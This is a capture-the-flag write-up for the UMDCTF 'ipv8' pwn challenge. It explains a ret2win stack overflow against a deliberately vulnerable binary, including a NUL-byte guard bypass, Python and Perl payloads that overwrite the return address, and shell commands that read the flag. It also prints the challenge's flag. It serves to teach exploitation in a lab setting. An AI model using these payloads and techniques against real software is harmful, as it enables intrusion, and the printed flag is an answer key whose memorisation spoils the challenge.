# UMDCTF pwn/ipv8 — Backwards-compatible ret2win exploit

**Author:** AnyMoR Entry JOL  
**Writeup/Figures license:** CC BY 4.0  
**Solver license:** MIT

## Challenge statement

```text
ipv8
tohkie

whats better than ipv9? ipv8 (backwards compatible) ofc!

nc challs.umdctf.io 30308
```

## Adapted objective

The title **“Backwards-compatible ret2win exploit”** already contains the solve path.

- **Backwards-compatible** refers to the challenge hint: although the challenge is called `ipv8`, the parser still accepts IPv4-looking strings such as `1.2.3.4`.
- **ret2win** refers to the exploitation strategy: instead of building a full ROP chain, we only need to redirect the saved return address to the existing `win()` function, more precisely to `win+4`.

So the practical objective is:

1. abuse the parser by keeping an IPv4-looking prefix;
2. use the **Source Host Address** field to overwrite the saved return address;
3. use the **Destination Host Address** field to bypass the local `RINE` guard;
4. let `main()` return into `win+4`;
5. send a command through the spawned shell to print the flag.

Final flag:

```text
UMDCTF{why_was_ipv9_afraid_of_ipv7?ipv789}
```

---

## 1. Beginner-friendly context

This is a **pwn** challenge. In practice, that means we are attacking a compiled binary by abusing how it stores or processes data in memory.

Useful concepts for this binary:

| Concept | Meaning in this challenge |
|---|---|
| ELF | Linux executable format. The local file is `./ipv4`. |
| Stack | Memory area containing local variables, saved frame pointers, and return addresses. |
| saved RIP | Saved return address on amd64. If we overwrite it, `ret` jumps where we choose. |
| ret2win | Redirecting execution to an already existing `win()` function. |
| PIE disabled | Code addresses are stable, so `win()` is at a fixed address. |
| RINE | A local C-string guard initialized to a blocked value such as `0.0.0.0`. |
| NUL byte | `\x00`, the end marker of a C string. `scanf("%s")` writes it automatically. |

This challenge is not about shellcode, ASLR bypass, or a long ROP chain. The shortest valid path is a **ret2win** plus a **guard bypass**.

---

## 2. Reconnaissance and proof of `win+4`

We start by proving the binary properties instead of guessing them.

```bash
file ./ipv4
checksec ./ipv4
nm -an ./ipv4 | grep -E ' win$| main$|check_'
strings -tx ./ipv4 | grep -E 'IPv8|RINE|flag|/bin/sh|Source|Destination'
objdump -d -M intel ./ipv4 | sed -n '/<win>:/,+10p'
```

Relevant disassembly:

```asm
0000000000402f45 <win>:
  402f45: 55                    push   rbp
  402f46: 48 89 e5              mov    rbp,rsp
  402f49: 48 8d 05 43 a5 09 00  lea    rax,[rip+0x9a543]
  402f50: 48 89 c7              mov    rdi,rax
  402f53: e8 48 38 00 00        call   4067a0 <__libc_system>
  402f58: 90                    nop
  402f59: 5d                    pop    rbp
  402f5a: c3                    ret
```

Why `win+4`?

| Offset | Address | Meaning |
|---|---:|---|
| `win+0` | `0x402f45` | start of `push rbp` |
| `win+1` | `0x402f46` | start of `mov rbp,rsp` |
| `win+2` | `0x402f47` | middle of the instruction |
| `win+3` | `0x402f48` | middle of the instruction |
| `win+4` | `0x402f49` | start of `lea rax,[...]` |

So:

- `win+2` and `win+3` are invalid intended targets because they land in the middle of an instruction;
- `win+1` is a possible boundary, but it still executes part of the prologue and is less clean;
- `win+4` is the first clean instruction in the useful body of `win()`.

That makes `0x402f49` the best return target.

---

## 2.1 Binary-side architecture as state transitions

Instead of showing only arrows, the following state machine shows the important control states of the binary.

As it is, the repository is set with the tree-level :
repo/
├── writeup.md
└── ipv8/
    └── images/
        └── ipv8_png_diagram_01_binary_states.png

![Binary-side architecture as state transitions](images/ipv8_png_diagram_01_binary_states.png)

*Figure 1. Binary-side architecture as state transitions.*

This already explains the core dependency of the exploit: **overwriting RIP is necessary but not sufficient**. We also need the program to survive long enough to reach the final `ret`.

---

## 2.2 Solver-side architecture as state transitions

The solver itself can also be seen as a state machine.

![Solver-side architecture as state transitions](images/ipv8_png_diagram_02_solver_states.png)

*Figure 2. Solver-side architecture as state transitions.*

This is why the corrected solver is useful for learning: each state corresponds to one logical step of the exploit.

---

## 3. Step-by-step exploit explanation with justifications

The following diagram focuses on the algorithm itself. It uses boxes and explicit transitions instead of plain arrows.

![Step-by-step exploit explanation with state boxes](images/ipv8_png_diagram_03_exploit_states.png)

*Figure 3. Step-by-step exploit explanation with state boxes.*

### Why each step exists

### Step 1 — Source ASN filler

This step looks useless, and in terms of memory corruption it is. Still, it matters operationally: the binary asks several prompts in a fixed order, so we must answer them in the same order or later data will land in the wrong field.

### Step 2 — Source Host overflow

This is the first real exploitation step.

Why does it work?

- the field is read with an unbounded `%s` into a local stack buffer;
- the parser only checks for an IPv4-looking shape, not for a strict address length;
- `1.2.3.4` gives us the required three dots;
- after that, padding bytes continue up to the saved return address.

Why 104 bytes?

- local buffer size: `0x60 = 96` bytes;
- saved RBP: `8` bytes;
- saved RIP comes next;
- total = `96 + 8 = 104`.

So the payload is:

```python
SRC = b"1.2.3.4" + b"A" * (104 - len(b"1.2.3.4")) + p64(0x402f49)
```

### Step 3 — Destination ASN filler

Just like Source ASN, this step is mostly structural. It is there because the binary is reading another prompt and we must stay synchronized.

### Step 4 — Destination Host guard bypass

This is the part that often surprises beginners. We are not using this field to smash RIP. We are using it to create a **one-byte side effect**.

The code is logically similar to:

```c
scanf("%48s", destination_host);
```

A bounded `%48s` still behaves like a C string read:

- it stores up to 48 visible bytes;
- then it writes a final `\x00`.

If the destination buffer is adjacent to the local `RINE` string, that final NUL may land on the first byte of `RINE`.

So even though the visible input is “safe”, the automatic terminator changes adjacent state.

The destination payload is:

```python
DST = b"1.2.3.4" + b"B" * (48 - len(b"1.2.3.4"))
```

### Step 5 — Let `main()` return

This is the real payoff of the RINE bypass.

If RINE is not changed, the binary may exit early and never reach the final `ret`.
If RINE is changed, `main()` survives long enough to return normally.
That return uses the saved RIP we already corrupted during the Source Host phase.

### Step 6 — Enter `win+4` and print the flag

`win+4` prepares the `/bin/sh` pointer and calls `system("/bin/sh")`.

But the shell alone is not enough. A human operator could type commands interactively, but the solver should automate that. So the final input stream appends:

```bash
cat flag.txt 2>/dev/null; cat /flag 2>/dev/null; cat /home/ctf/flag.txt 2>/dev/null; id; exit
```

That gives:

- the flag, if one of the common paths exists;
- `id` as proof of command execution;
- `exit` to terminate the spawned shell cleanly.

---

## 4. Stack layout and payload derivation

The stack reasoning is the fastest way to justify the source offset.

![Stack layout and payload derivation](images/ipv8_png_diagram_04_stack.png)

*Figure 4. Stack layout and payload derivation.*

This explains both exploit distances:

- **Source Host → saved RIP**: `0x60 + 0x08 = 0x68 = 104` bytes;
- **Destination Host → RINE**: close enough that scanf’s terminator changes the adjacent string.

---

## 5. RINE mutation mechanism

![RINE mutation mechanism](images/ipv8_png_diagram_05_rine.png)

*Figure 5. RINE mutation mechanism.*

This is the heart of the bypass: a **bounded** input still causes a meaningful adjacent write because C strings must end with a NUL byte.

---

## 6. Why this exploit is the best one

This is the best path for this binary because it uses the shortest set of facts already provided by the target.

- `win()` already exists;
- `win()` already calls `system("/bin/sh")`;
- PIE is disabled, so `win+4` is a stable address;
- the weak parser accepts an IPv4-looking prefix;
- the `RINE` guard can be bypassed with a one-byte side effect.

So we do **not** need:

- shellcode;
- a libc leak;
- ret2libc;
- a long ROP chain.

Those techniques would work only if the binary gave us fewer direct primitives. Here, the shortest path is also the strongest writeup path, because each step can be justified directly from the binary.

---

## 7. How to find the exploit in practice

![How to find the exploit in practice](images/ipv8_png_diagram_06_discovery.png)

*Figure 6. How to find the exploit in practice.*

This is why the exploit is easy to find **once the right questions are asked**:

1. where is `win()`?
2. what is the exact offset to saved RIP?
3. why is RIP control not enough?
4. which adjacent local state prevents `main()` from returning?
5. which input changes that state?

---

## 8. Local proof without the solver

A minimal local proof can be done with Perl:

```bash
perl -e '
print "x\n";
print "1.2.3.4" . "A" x (104-7) . pack("Q<", 0x402f49) . "\n";
print "x\n";
print "1.2.3.4" . "B" x (48-7) . "\n";
print "echo PWNED; id; exit\n";
' | ./ipv4
```

Expected useful output:

```text
Wrong RINE address!! Perhaps you were looking for 100.72.7.67
PWNED
uid=...
```

The process may crash after the shell exits. That is not a problem if the command has already executed.

---

## 9. Solver variants and launch modes

There is nothing to compile. These are Python scripts.

| Solver | Purpose | Local | Remote | Verbose |
|---|---|---|---|---|
| `solve_ipv8_corrected.py` | learning/debugging | `python3 solve_ipv8_corrected.py --local ./ipv4` | `python3 solve_ipv8_corrected.py --remote --host challs.umdctf.io --port 30308` | yes, add `-v` |
| `solve_ipv8_optimized.py` | final one-shot run | `python3 solve_ipv8_optimized.py --local ./ipv4` | `python3 solve_ipv8_optimized.py --remote --host challs.umdctf.io --port 30308` | no |

Verbose corrected run:

```bash
python3 solve_ipv8_corrected.py --local ./ipv4 -v
python3 solve_ipv8_corrected.py --remote --host challs.umdctf.io --port 30308 -v
```

Optimized final run:

```bash
python3 solve_ipv8_optimized.py --local ./ipv4
python3 solve_ipv8_optimized.py --remote --host challs.umdctf.io --port 30308
```

For slow connections:

```bash
python3 solve_ipv8_optimized.py --remote --host challs.umdctf.io --port 30308 --timeout 5
```

---

## 10. Common mistakes

| Mistake | Why it fails |
|---|---|
| Running `./ipv8` locally | The local binary is usually named `./ipv4`. |
| Targeting `win+1` | It is less clean than `win+4` and not needed here. |
| Targeting `win+2` or `win+3` | They land in the middle of an instruction. |
| Forgetting the `1.2.3.4` prefix | The parser expects exactly three dots. |
| Destination shorter than 48 bytes | The final NUL stays inside the buffer and does not mutate RINE. |
| Only overwriting RIP | The program may exit through the RINE check before returning. |
| Waiting for an interactive shell only | The solver should send `cat flag...; id; exit` automatically. |

---

## 11. Synthesis

The exploit combines two different primitives:

1. **Source Host Address** gives saved RIP control after 104 bytes.
2. **Destination Host Address** gives a one-byte adjacent-state mutation through scanf’s final NUL.

Each primitive alone is incomplete:

- RIP overwrite alone is useless if the binary exits before `ret`;
- RINE bypass alone is useless if saved RIP is not controlled.

Together, they create a clean ret2win chain into `win+4`.

---

## 12. Conclusion

This challenge is a very good beginner-to-intermediate ret2win exercise because it teaches a deeper lesson than “find offset, jump to win”. The real solve path is:

- find the stable target (`win+4`);
- justify the 104-byte source offset;
- understand why control flow does not jump immediately;
- identify the RINE guard as the blocking condition;
- use the destination field to mutate that guard with scanf’s final NUL;
- let `main()` return and consume the overwritten saved RIP.

The exploit is elegant because it is also the simplest one that matches the binary:

- no shellcode;
- no ret2libc;
- no long ROP chain;
- no unnecessary complexity.

Final flag:

```text
UMDCTF{why_was_ipv9_afraid_of_ipv7?ipv789}
```
